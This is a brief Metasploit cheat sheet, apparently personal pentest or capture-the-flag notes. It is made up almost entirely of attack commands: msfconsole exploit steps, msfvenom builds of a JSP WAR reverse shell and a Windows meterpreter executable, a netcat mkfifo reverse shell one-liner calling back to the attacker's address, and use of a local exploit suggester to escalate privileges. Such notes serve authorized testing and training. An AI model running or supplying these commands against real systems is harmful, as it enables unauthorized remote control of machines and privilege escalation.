
MSFconsole
---
```
search $TARGET_SERVICE
use X
 options
set LHOST
set RHOST
exploit
shell
background
```

See payload options:

```shell
msfvenom -p java/jsp_shell_reverse_tcp --list-options
```

Create payload:

```shell
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LOCAL_IP LPORT=4444 -f war > runme.war
```

Create bash reverse shell line:

```shell
msfvenom -p cmd/unix/reverse_netcat RHOST=tun0 RPORT=4444 R
```

```shell
mkfifo /tmp/ipvquh; nc $LOCAL_IP 4444 0</tmp/ipvquh | /bin/sh >/tmp/ipvquh 2>&1; rm /tmp/ipvquh
```

Create reverse shell payload, exploit user and escalate to admin:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp -a x64 --platform windows LHOST=$LOCAL_IP LPORT=4444 -f exe > shell.exe
```

```msfconsole
use windows/x64/meterpreter/reverse_tcp
use windows/meterpreter/reverse_tcp
set LHOST tun0
set LPORT 4444
exploit
use post/multi/recon/local_exploit_suggester
set session 1
exploit
#don't forget to set new handler to tun0 and new port
```